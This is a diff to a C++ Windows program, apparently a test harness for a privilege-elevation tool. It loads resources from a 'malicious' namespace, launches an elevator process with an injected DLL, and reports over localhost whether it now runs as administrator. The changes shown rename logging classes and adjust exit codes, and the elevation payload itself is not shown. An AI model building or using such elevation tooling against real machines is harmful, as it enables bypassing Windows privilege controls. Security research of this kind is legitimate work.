@@ -1,4 +1,4 @@
-#include <common/Logger.hpp>
+#include <common/Log.hpp>
 #include <malicious/BinaryRessource.hpp>
 #include <system/ThisProcess.hpp>
 #include <system/System.hpp>
@@ -11,6 +11,7 @@ using namespace System;
 using namespace Malicious;
 
 #include <string>
+#include <iostream>
 using namespace std;
 
 #include <ElevatorDll32.hpp>
@@ -30,29 +31,33 @@ DWORD WINAPI MsgLoop(LPVOID lpParameter)
 		if(buffer.size())
 		{
 			LOG << buffer;
+			if(buffer == "ADMINISTRATOR")
+			{
+				exit(EXIT_SUCCESS);
+			}
 		}
 	}
-	return 0;
+	return EXIT_FAILURE;
 }
 
 int main()
 {
 	try
 	{
-		DWORD dwThread = 0;
+		DWORD dwThread = EXIT_FAILURE;
 		HANDLE hThread = 0;
 		if(isAdministrator())
 		{
 			LOG.setHeader("FROM ELEVATED PROCESS");
-			LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 8000));
-			LOG << "Vous etes administrateur !";
+			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 8000));
+			LOG.sendRaw("ADMINISTRATOR");
 			return EXIT_SUCCESS;
 		}
 		else
 		{
-			LOG.setHeader("ELEVATION");
-			LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
-			LOG.addObserver(new Common::LoggingMessage);
+			LOG.setHeader("TEST ELEVATION");
+			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
+			LOG.addObserver(new Common::LogToConsole);
 			LOG << "Vous n'etes pas administrateur !";
 			hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
 		}
@@ -104,8 +109,7 @@ int main()
     					
 					Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
 					LOG << "Waiting elevator to finish...";
-					DWORD exitCode = elevatorProcess.wait();
-					LOG << "Exit code of elevated process : "+to_string(exitCode);
+					DWORD exitCode = elevatorProcess.wait();					
 
 					delete elevatorDll;
 					delete elevator;
@@ -120,6 +124,7 @@ int main()
 		{
 			LOG << "Echec TerminateThread : " + to_string(GetLastError());
 		}
+		return dwThread;
     }
     catch(std::exception& e)
     {
@@ -129,5 +134,5 @@ int main()
 	{
 		LOG << "Erreur d'origine inconnue.";
 	}
-	return EXIT_SUCCESS;
+	return EXIT_FAILURE;
 }
